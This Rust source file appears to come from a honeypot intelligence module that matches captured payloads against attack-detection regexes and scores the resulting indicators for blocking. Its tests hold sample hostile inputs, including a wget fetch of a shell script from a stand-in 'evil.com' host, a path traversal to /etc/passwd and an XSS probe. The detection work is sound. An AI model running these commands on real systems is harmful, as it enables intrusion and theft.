use std::sync::LazyLock;

use crate::protocol::Confidence;
use crate::storage::HoneypotRecord;
use regex::Regex;
use serde::{Deserialize, Serialize};

static SQL_PATTERN: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)\bselect\s+[\w\s*.,-]+\s+from\b").unwrap());
static XSS_PATTERN: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)<\s*script[^>]*>|javascript\s*:").unwrap());
static PATH_TRAVERSAL_PATTERN: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)\.\./|\.\.\\").unwrap());
static LFI_PATTERN: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)/etc/(passwd|shadow|hosts)").unwrap());
static RCE_PATTERN: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"(?i)\b(wget|curl|nc|ncat)\s+['"]?https?://"#).unwrap());
static SHELL_PATTERN: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)\b(bash|sh)\s+-[ic]").unwrap());
static PHP_PATTERN: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)<\?php|phpinfo\s*\(").unwrap());
static WP_PATTERN: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)/wp-admin/|/wp-login.php").unwrap());
static ADMIN_PATTERN: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)/admin(?:/login)?|/administrator").unwrap());
static VC_PATTERN: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)/\.git/|/\.svn/HEAD").unwrap());
static AWS_PATTERN: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)(aws_access_key|aws_secret|access_key_id|secret_access_key)").unwrap()
});
static REDIS_PATTERN: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)\bredis.*config\s+set\b").unwrap());
static MONGO_PATTERN: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)\bmongo(?:db)?\s*\.\s*").unwrap());

#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum SignalClass {
    ProtocolProbe,
    KnownAttackPattern,
    RepeatedHit,
    ExploitPayload,
    CredentialAttempt,
    ScannerFingerprint,
    MalwareCorrelation,
}

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
pub enum IndicatorActionClass {
    Observe,
    LocalRateLimitCandidate,
    LocalBlockCandidate,
    MeshShareCandidate,
    MeshBlockCandidate,
}

impl IndicatorActionClass {
    pub fn allows_mesh_propagation(&self) -> bool {
        matches!(
            self,
            IndicatorActionClass::MeshShareCandidate | IndicatorActionClass::MeshBlockCandidate
        )
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HoneypotSignalScore {
    pub confidence: Confidence,
    pub severity: SeverityLevel,
    pub signal_class: SignalClass,
    pub event_count: u32,
    pub distinct_ports: u32,
    pub attack_patterns: u32,
    pub first_seen: i64,
    pub last_seen: i64,
    pub score: f64,
    pub action_class: IndicatorActionClass,
    pub payload_truncated: bool,
}

impl HoneypotSignalScore {
    pub fn compute_score(
        config: &ScoringConfig,
        signal_class: &SignalClass,
        confidence: Confidence,
        event_count: u32,
        distinct_ports: u32,
        attack_patterns: u32,
        payload_truncated: bool,
    ) -> (f64, IndicatorActionClass) {
        let mut score = signal_class.base_score(config);

        match confidence {
            Confidence::High => {}
            Confidence::Medium => score *= 0.8,
            Confidence::Low => score *= 0.5,
        }

        let repeat_bonus = (event_count as f64 - 1.0) * config.repeat_bonus_factor;
        let repeat_bonus = repeat_bonus.min(config.repeat_max_bonus);
        score += repeat_bonus;

        let port_bonus = (distinct_ports as f64) * config.distinct_port_bonus;
        let port_bonus = port_bonus.min(config.distinct_port_max_bonus);
        score += port_bonus;

        let pattern_bonus = (attack_patterns as f64) * config.attack_pattern_bonus;
        let pattern_bonus = pattern_bonus.min(config.attack_pattern_max_bonus);
        score += pattern_bonus;

        if payload_truncated {
            score -= config.truncation_penalty;
        }

        score = score.clamp(0.0, 1.0);

        let action_class = Self::classify_action(score, config);

        (score, action_class)
    }

    pub fn classify_action(score: f64, config: &ScoringConfig) -> IndicatorActionClass {
        if score >= config.threshold_mesh_block {
            IndicatorActionClass::MeshBlockCandidate
        } else if score >= config.threshold_mesh_share {
            IndicatorActionClass::MeshShareCandidate
        } else if score >= config.threshold_local_block {
            IndicatorActionClass::LocalBlockCandidate
        } else if score >= config.threshold_rate_limit {
            IndicatorActionClass::LocalRateLimitCandidate
        } else {
            IndicatorActionClass::Observe
        }
    }

    pub fn apply_decay(score: f64, elapsed_secs: u64, half_life_secs: u64) -> f64 {
        if half_life_secs == 0 {
            return 0.0;
        }
        score * 0.5f64.powf(elapsed_secs as f64 / half_life_secs as f64)
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScoringConfig {
    pub base_score_protocol_probe: f64,
    pub base_score_attack_pattern: f64,
    pub base_score_exploit_payload: f64,
    pub base_score_credential_attempt: f64,
    pub base_score_scanner_fingerprint: f64,
    pub repeat_bonus_factor: f64,
    pub repeat_max_bonus: f64,
    pub distinct_port_bonus: f64,
    pub distinct_port_max_bonus: f64,
    pub attack_pattern_bonus: f64,
    pub attack_pattern_max_bonus: f64,
    pub truncation_penalty: f64,
    pub decay_half_life_secs: u64,
    pub threshold_rate_limit: f64,
    pub threshold_local_block: f64,
    pub threshold_mesh_share: f64,
    pub threshold_mesh_block: f64,
    pub min_events_for_mesh: u32,
    pub min_confidence_for_mesh: Confidence,
    pub mesh_ttl_secs: u64,
}

impl Default for ScoringConfig {
    fn default() -> Self {
        Self {
            base_score_protocol_probe: 0.1,
            base_score_attack_pattern: 0.5,
            base_score_exploit_payload: 0.7,
            base_score_credential_attempt: 0.6,
            base_score_scanner_fingerprint: 0.3,
            repeat_bonus_factor: 0.1,
            repeat_max_bonus: 0.3,
            distinct_port_bonus: 0.05,
            distinct_port_max_bonus: 0.2,
            attack_pattern_bonus: 0.1,
            attack_pattern_max_bonus: 0.3,
            truncation_penalty: 0.2,
            decay_half_life_secs: 3600,
            threshold_rate_limit: 0.3,
            threshold_local_block: 0.6,
            threshold_mesh_share: 0.75,
            threshold_mesh_block: 0.9,
            min_events_for_mesh: 3,
            min_confidence_for_mesh: Confidence::Medium,
            mesh_ttl_secs: 86400,
        }
    }
}

impl SignalClass {
    pub fn base_score(&self, config: &ScoringConfig) -> f64 {
        match self {
            SignalClass::ProtocolProbe => config.base_score_protocol_probe,
            SignalClass::KnownAttackPattern => config.base_score_attack_pattern,
            SignalClass::RepeatedHit => config.base_score_attack_pattern,
            SignalClass::ExploitPayload => config.base_score_exploit_payload,
            SignalClass::CredentialAttempt => config.base_score_credential_attempt,
            SignalClass::ScannerFingerprint => config.base_score_scanner_fingerprint,
            SignalClass::MalwareCorrelation => config.base_score_exploit_payload,
        }
    }
}

pub struct HoneypotIntelExtractor;

impl HoneypotIntelExtractor {
    pub fn extract_indicators(record: &HoneypotRecord) -> Vec<HoneypotIndicator> {
        let mut indicators = Vec::new();

        indicators.push(HoneypotIndicator {
            indicator_type: IndicatorType::SourceIp,
            value: record.remote_ip.clone(),
            severity: SeverityLevel::cap_by_confidence(
                SeverityLevel::from_service(&record.service),
                record.confidence,
            ),
            description: format!(
                "Honeypot connection from {} to {} on port {}",
                record.remote_ip, record.service, record.local_port
            ),
            metadata: Some(record.payload_hex.clone()),
        });

        if let Some(ref pattern) = record.detected_pattern {
            indicators.push(HoneypotIndicator {
                indicator_type: IndicatorType::AttackPattern,
                value: pattern.clone(),
                severity: SeverityLevel::cap_by_confidence(SeverityLevel::High, record.confidence),
                description: format!("Detected attack pattern: {}", pattern),
                metadata: Some(record.payload_hex.clone()),
            });
        }

        if let Ok(payload_str) = std::str::from_utf8(&record.payload) {
            let attack_types = Self::detect_attack_types(payload_str);
            for attack in attack_types {
                indicators.push(HoneypotIndicator {
                    indicator_type: IndicatorType::AttackVector,
                    value: attack.clone(),
                    severity: SeverityLevel::cap_by_confidence(
                        SeverityLevel::High,
                        record.confidence,
                    ),
                    description: format!("Attack vector detected: {}", attack),
                    metadata: Some(record.payload_hex.clone()),
                });
            }
        }

        indicators
    }

    pub fn score_indicator(
        config: &ScoringConfig,
        record: &HoneypotRecord,
        signal_class: &SignalClass,
        event_count: u32,
        distinct_ports: u32,
        attack_patterns: u32,
    ) -> HoneypotSignalScore {
        let (score, action_class) = HoneypotSignalScore::compute_score(
            config,
            signal_class,
            record.confidence,
            event_count,
            distinct_ports,
            attack_patterns,
            record.payload_truncated,
        );

        HoneypotSignalScore {
            confidence: record.confidence,
            severity: SeverityLevel::cap_by_confidence(
                SeverityLevel::from_service(&record.service),
                record.confidence,
            ),
            signal_class: signal_class.clone(),
            event_count,
            distinct_ports,
            attack_patterns,
            first_seen: record.timestamp,
            last_seen: record.timestamp,
            score,
            action_class,
            payload_truncated: record.payload_truncated,
        }
    }

    pub fn compute_dedupe_key(indicator_type: &IndicatorType, value: &str) -> String {
        format!("{:?}:{}", indicator_type, value)
    }

    fn detect_attack_types(payload: &str) -> Vec<String> {
        let mut attacks = Vec::new();
        let payload_lower = payload.to_lowercase();

        if SQL_PATTERN.is_match(&payload_lower) {
            attacks.push("SQL Injection".to_string());
        }

        if XSS_PATTERN.is_match(&payload_lower) {
            attacks.push("XSS".to_string());
        }

        if PATH_TRAVERSAL_PATTERN.is_match(&payload_lower) {
            attacks.push("Path Traversal".to_string());
        }

        if LFI_PATTERN.is_match(&payload_lower) {
            attacks.push("LFI".to_string());
        }

        if RCE_PATTERN.is_match(&payload_lower) {
            attacks.push("Remote Code Execution Attempt".to_string());
        }

        if SHELL_PATTERN.is_match(&payload_lower) {
            attacks.push("Shell Command Injection".to_string());
        }

        if PHP_PATTERN.is_match(&payload_lower) {
            attacks.push("PHP Exploitation".to_string());
        }

        if WP_PATTERN.is_match(&payload_lower) {
            attacks.push("WordPress Attack".to_string());
        }

        if ADMIN_PATTERN.is_match(&payload_lower) && payload_lower.contains("login") {
            attacks.push("Admin Panel Probe".to_string());
        }

        if VC_PATTERN.is_match(&payload_lower) {
            attacks.push("Version Control Leak".to_string());
        }

        if AWS_PATTERN.is_match(&payload_lower) {
            attacks.push("AWS Credential Theft".to_string());
        }

        if REDIS_PATTERN.is_match(&payload_lower) {
            attacks.push("Redis Attack".to_string());
        }

        if MONGO_PATTERN.is_match(&payload_lower) && payload_lower.contains("db") {
            attacks.push("MongoDB Attack".to_string());
        }

        attacks
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HoneypotIndicator {
    pub indicator_type: IndicatorType,
    pub value: String,
    pub severity: SeverityLevel,
    pub description: String,
    pub metadata: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum IndicatorType {
    SourceIp,
    AttackPattern,
    AttackVector,
    Payload,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum SeverityLevel {
    Critical,
    High,
    Medium,
    Low,
}

impl SeverityLevel {
    pub fn from_service(service: &str) -> Self {
        match service.to_lowercase().as_str() {
            "ssh" | "telnet" | "mysql" | "redis" | "mongodb" | "elasticsearch" => {
                SeverityLevel::High
            }
            "http" | "https" => SeverityLevel::Medium,
            _ => SeverityLevel::Low,
        }
    }

    /// Cap severity based on detection confidence.
    /// Low confidence: max Medium; High confidence: no cap.
    pub fn cap_by_confidence(severity: Self, confidence: Confidence) -> Self {
        match confidence {
            Confidence::Low => match severity {
                SeverityLevel::Critical | SeverityLevel::High => SeverityLevel::Medium,
                other => other,
            },
            Confidence::Medium => match severity {
                SeverityLevel::Critical => SeverityLevel::High,
                other => other,
            },
            Confidence::High => severity,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::storage::HoneypotRecord;

    fn make_record(service: &str, payload: &[u8], pattern: Option<String>) -> HoneypotRecord {
        HoneypotRecord {
            id: 1,
            timestamp: 1234567890,
            remote_ip: "192.168.1.100".to_string(),
            remote_port: 12345,
            local_port: 22,
            protocol: "tcp".to_string(),
            service: service.to_string(),
            confidence: Confidence::High,
            payload: payload.to_vec(),
            payload_hex: hex::encode(payload),
            detected_pattern: pattern,
            bytes_received: payload.len() as u32,
            bytes_sent: 0,
            duration_ms: 100,
            connection_info: "192.168.1.100:12345".to_string(),
            payload_truncated: false,
            payload_hash: None,
            payload_length: None,
        }
    }

    #[test]
    fn test_extract_source_ip_indicator() {
        let record = make_record("ssh", b"", None);
        let indicators = HoneypotIntelExtractor::extract_indicators(&record);

        assert!(!indicators.is_empty());
        assert_eq!(indicators[0].indicator_type, IndicatorType::SourceIp);
        assert_eq!(indicators[0].value, "192.168.1.100");
    }

    #[test]
    fn test_extract_pattern_indicator() {
        let record = make_record("ssh", b"", Some("SSH-".to_string()));
        let indicators = HoneypotIntelExtractor::extract_indicators(&record);

        let pattern_indicators: Vec<_> = indicators
            .iter()
            .filter(|i| i.indicator_type == IndicatorType::AttackPattern)
            .collect();

        assert!(!pattern_indicators.is_empty());
    }

    #[test]
    fn test_detect_sql_injection() {
        let record = make_record("http", b"SELECT * FROM users", None);
        let indicators = HoneypotIntelExtractor::extract_indicators(&record);

        let sql_indicators: Vec<_> = indicators
            .iter()
            .filter(|i| i.value.contains("SQL"))
            .collect();

        assert!(!sql_indicators.is_empty());
    }

    #[test]
    fn test_detect_xss() {
        let record = make_record("http", b"<script>alert(1)</script>", None);
        let indicators = HoneypotIntelExtractor::extract_indicators(&record);

        let xss_indicators: Vec<_> = indicators
            .iter()
            .filter(|i| i.value.contains("XSS"))
            .collect();

        assert!(!xss_indicators.is_empty());
    }

    #[test]
    fn test_detect_lfi() {
        let record = make_record("http", b"../../etc/passwd", None);
        let indicators = HoneypotIntelExtractor::extract_indicators(&record);

        let lfi_indicators: Vec<_> = indicators
            .iter()
            .filter(|i| i.value.contains("Path Traversal"))
            .collect();

        assert!(!lfi_indicators.is_empty());
    }

    #[test]
    fn test_detect_command_injection() {
        let record = make_record("ssh", b"wget http://evil.com/shell.sh", None);
        let indicators = HoneypotIntelExtractor::extract_indicators(&record);

        let cmd_indicators: Vec<_> = indicators
            .iter()
            .filter(|i| i.value.contains("Remote Code"))
            .collect();

        assert!(!cmd_indicators.is_empty());
    }

    #[test]
    fn test_severity_from_service() {
        assert_eq!(SeverityLevel::from_service("ssh"), SeverityLevel::High);
        assert_eq!(SeverityLevel::from_service("mysql"), SeverityLevel::High);
        assert_eq!(SeverityLevel::from_service("http"), SeverityLevel::Medium);
        assert_eq!(SeverityLevel::from_service("ftp"), SeverityLevel::Low);
    }

    #[test]
    fn test_multiple_attack_types() {
        let payload = b"SELECT * FROM users<script>alert(1)</script>../../etc/passwd";
        let record = make_record("http", payload, None);
        let indicators = HoneypotIntelExtractor::extract_indicators(&record);

        // Should detect multiple attack types
        assert!(indicators.len() >= 3);
    }

    #[test]
    fn test_low_confidence_caps_high_severity_to_medium() {
        let mut record = make_record("ssh", b"", None);
        record.confidence = Confidence::Low;
        let indicators = HoneypotIntelExtractor::extract_indicators(&record);

        // SSH service maps to High, but Low confidence caps to Medium
        let source_ip = indicators
            .iter()
            .find(|i| i.indicator_type == IndicatorType::SourceIp)
            .unwrap();
        assert_eq!(source_ip.severity, SeverityLevel::Medium);
    }

    #[test]
    fn test_low_confidence_caps_attack_pattern_to_medium() {
        let mut record = make_record("ssh", b"", Some("ssh_banner_prefix".to_string()));
        record.confidence = Confidence::Low;
        let indicators = HoneypotIntelExtractor::extract_indicators(&record);

        let pattern = indicators
            .iter()
            .find(|i| i.indicator_type == IndicatorType::AttackPattern)
            .unwrap();
        assert_eq!(pattern.severity, SeverityLevel::Medium);
    }

    #[test]
    fn test_high_confidence_preserves_service_severity() {
        let mut record = make_record("ssh", b"", None);
        record.confidence = Confidence::High;
        let indicators = HoneypotIntelExtractor::extract_indicators(&record);

        let source_ip = indicators
            .iter()
            .find(|i| i.indicator_type == IndicatorType::SourceIp)
            .unwrap();
        assert_eq!(source_ip.severity, SeverityLevel::High);
    }

    #[test]
    fn test_medium_confidence_caps_critical_to_high() {
        let severity =
            SeverityLevel::cap_by_confidence(SeverityLevel::Critical, Confidence::Medium);
        assert_eq!(severity, SeverityLevel::High);
    }

    #[test]
    fn test_medium_confidence_preserves_high() {
        let severity = SeverityLevel::cap_by_confidence(SeverityLevel::High, Confidence::Medium);
        assert_eq!(severity, SeverityLevel::High);
    }

    #[test]
    fn test_low_confidence_caps_critical_to_medium() {
        let severity = SeverityLevel::cap_by_confidence(SeverityLevel::Critical, Confidence::Low);
        assert_eq!(severity, SeverityLevel::Medium);
    }

    #[test]
    fn test_low_confidence_preserves_low() {
        let severity = SeverityLevel::cap_by_confidence(SeverityLevel::Low, Confidence::Low);
        assert_eq!(severity, SeverityLevel::Low);
    }

    #[test]
    fn test_high_confidence_preserves_all() {
        assert_eq!(
            SeverityLevel::cap_by_confidence(SeverityLevel::Critical, Confidence::High),
            SeverityLevel::Critical
        );
        assert_eq!(
            SeverityLevel::cap_by_confidence(SeverityLevel::High, Confidence::High),
            SeverityLevel::High
        );
        assert_eq!(
            SeverityLevel::cap_by_confidence(SeverityLevel::Medium, Confidence::High),
            SeverityLevel::Medium
        );
        assert_eq!(
            SeverityLevel::cap_by_confidence(SeverityLevel::Low, Confidence::High),
            SeverityLevel::Low
        );
    }

    #[test]
    fn test_scoring_config_default() {
        let config = ScoringConfig::default();
        assert_eq!(config.base_score_protocol_probe, 0.1);
        assert_eq!(config.base_score_attack_pattern, 0.5);
        assert_eq!(config.base_score_exploit_payload, 0.7);
        assert_eq!(config.base_score_credential_attempt, 0.6);
        assert_eq!(config.base_score_scanner_fingerprint, 0.3);
        assert_eq!(config.repeat_bonus_factor, 0.1);
        assert_eq!(config.repeat_max_bonus, 0.3);
        assert_eq!(config.distinct_port_bonus, 0.05);
        assert_eq!(config.distinct_port_max_bonus, 0.2);
        assert_eq!(config.attack_pattern_bonus, 0.1);
        assert_eq!(config.attack_pattern_max_bonus, 0.3);
        assert_eq!(config.truncation_penalty, 0.2);
        assert_eq!(config.decay_half_life_secs, 3600);
        assert_eq!(config.threshold_rate_limit, 0.3);
        assert_eq!(config.threshold_local_block, 0.6);
        assert_eq!(config.threshold_mesh_share, 0.75);
        assert_eq!(config.threshold_mesh_block, 0.9);
        assert_eq!(config.min_events_for_mesh, 3);
        assert_eq!(config.min_confidence_for_mesh, Confidence::Medium);
        assert_eq!(config.mesh_ttl_secs, 86400);
    }

    #[test]
    fn test_signal_class_base_score() {
        let config = ScoringConfig::default();
        assert_eq!(SignalClass::ProtocolProbe.base_score(&config), 0.1);
        assert_eq!(SignalClass::KnownAttackPattern.base_score(&config), 0.5);
        assert_eq!(SignalClass::ExploitPayload.base_score(&config), 0.7);
        assert_eq!(SignalClass::CredentialAttempt.base_score(&config), 0.6);
        assert_eq!(SignalClass::ScannerFingerprint.base_score(&config), 0.3);
        assert_eq!(SignalClass::MalwareCorrelation.base_score(&config), 0.7);
    }

    #[test]
    fn test_classify_action_thresholds() {
        let config = ScoringConfig::default();
        assert_eq!(
            HoneypotSignalScore::classify_action(0.0, &config),
            IndicatorActionClass::Observe
        );
        assert_eq!(
            HoneypotSignalScore::classify_action(0.3, &config),
            IndicatorActionClass::LocalRateLimitCandidate
        );
        assert_eq!(
            HoneypotSignalScore::classify_action(0.6, &config),
            IndicatorActionClass::LocalBlockCandidate
        );
        assert_eq!(
            HoneypotSignalScore::classify_action(0.75, &config),
            IndicatorActionClass::MeshShareCandidate
        );
        assert_eq!(
            HoneypotSignalScore::classify_action(0.9, &config),
            IndicatorActionClass::MeshBlockCandidate
        );
    }

    #[test]
    fn test_apply_decay() {
        let score = 1.0;
        let half_life = 3600u64;

        // At t=0, no decay
        let decayed = HoneypotSignalScore::apply_decay(score, 0, half_life);
        assert!((decayed - 1.0).abs() < f64::EPSILON);

        // At t=half_life, score should be ~0.5
        let decayed = HoneypotSignalScore::apply_decay(score, half_life, half_life);
        assert!((decayed - 0.5).abs() < 0.001);

        // At t=2*half_life, score should be ~0.25
        let decayed = HoneypotSignalScore::apply_decay(score, half_life * 2, half_life);
        assert!((decayed - 0.25).abs() < 0.001);

        // Zero half_life returns 0
        let decayed = HoneypotSignalScore::apply_decay(score, 100, 0);
        assert_eq!(decayed, 0.0);
    }

    #[test]
    fn test_compute_score_observe() {
        let config = ScoringConfig::default();
        let (score, action) = HoneypotSignalScore::compute_score(
            &config,
            &SignalClass::ProtocolProbe,
            Confidence::Low,
            1,
            0,
            0,
            false,
        );
        // 0.1 * 0.5 (low confidence) + 0 + 0 + 0 = 0.05 -> Observe
        assert!((score - 0.05).abs() < 0.001);
        assert_eq!(action, IndicatorActionClass::Observe);
    }

    #[test]
    fn test_compute_score_mesh_block() {
        let config = ScoringConfig::default();
        let (score, action) = HoneypotSignalScore::compute_score(
            &config,
            &SignalClass::ExploitPayload,
            Confidence::High,
            10,
            5,
            3,
            false,
        );
        // 0.7 + 0.9 (repeat capped) + 0.2 (port capped) + 0.3 (pattern capped) = 2.1 -> clamped to 1.0
        assert_eq!(score, 1.0);
        assert_eq!(action, IndicatorActionClass::MeshBlockCandidate);
    }

    #[test]
    fn test_compute_score_truncation_penalty() {
        let config = ScoringConfig::default();
        let (score_truncated, _) = HoneypotSignalScore::compute_score(
            &config,
            &SignalClass::ExploitPayload,
            Confidence::High,
            1,
            1,
            0,
            true,
        );
        let (score_clean, _) = HoneypotSignalScore::compute_score(
            &config,
            &SignalClass::ExploitPayload,
            Confidence::High,
            1,
            1,
            0,
            false,
        );
        assert!((score_clean - score_truncated - 0.2).abs() < 0.001);
    }

    #[test]
    fn test_compute_score_repeat_bonus_diminishing() {
        let config = ScoringConfig::default();
        let (score1, _) = HoneypotSignalScore::compute_score(
            &config,
            &SignalClass::KnownAttackPattern,
            Confidence::High,
            1,
            1,
            0,
            false,
        );
        let (score5, _) = HoneypotSignalScore::compute_score(
            &config,
            &SignalClass::KnownAttackPattern,
            Confidence::High,
            5,
            1,
            0,
            false,
        );
        let (score10, _) = HoneypotSignalScore::compute_score(
            &config,
            &SignalClass::KnownAttackPattern,
            Confidence::High,
            10,
            1,
            0,
            false,
        );
        // Repeat bonus caps at 0.3
        assert!((score10 - score5).abs() < f64::EPSILON);
        assert!(score5 > score1);
    }

    #[test]
    fn test_mesh_propagation_allowed() {
        assert!(IndicatorActionClass::MeshShareCandidate.allows_mesh_propagation());
        assert!(IndicatorActionClass::MeshBlockCandidate.allows_mesh_propagation());
        assert!(!IndicatorActionClass::Observe.allows_mesh_propagation());
        assert!(!IndicatorActionClass::LocalRateLimitCandidate.allows_mesh_propagation());
        assert!(!IndicatorActionClass::LocalBlockCandidate.allows_mesh_propagation());
    }

    #[test]
    fn test_score_indicator() {
        let config = ScoringConfig::default();
        let record = make_record("ssh", b"", None);
        let score = HoneypotIntelExtractor::score_indicator(
            &config,
            &record,
            &SignalClass::ProtocolProbe,
            1,
            1,
            0,
        );
        assert_eq!(score.confidence, Confidence::High);
        assert_eq!(score.severity, SeverityLevel::High);
        assert_eq!(score.signal_class, SignalClass::ProtocolProbe);
        assert!(!score.payload_truncated);
    }

    #[test]
    fn test_compute_dedupe_key() {
        let key = HoneypotIntelExtractor::compute_dedupe_key(&IndicatorType::SourceIp, "10.0.0.1");
        assert_eq!(key, "SourceIp:10.0.0.1");

        let key = HoneypotIntelExtractor::compute_dedupe_key(&IndicatorType::AttackPattern, "SQLi");
        assert_eq!(key, "AttackPattern:SQLi");
    }
}
